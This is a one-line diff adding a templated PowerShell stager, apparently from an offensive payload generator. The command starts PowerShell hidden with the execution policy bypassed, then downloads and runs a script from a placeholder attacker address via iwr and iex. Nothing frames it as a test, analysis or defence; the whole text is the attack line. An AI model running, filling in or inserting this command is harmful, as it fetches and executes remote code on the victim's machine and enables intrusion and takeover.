@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "iex (iwr -UseBasicParsing {{ATTACKER_PROTOCOL}}://{{ATTACKER_ADDRESS}}/{{POWERSHELL_GENERATOR_SCRIPT_NAME}}.ps1)"; Exit
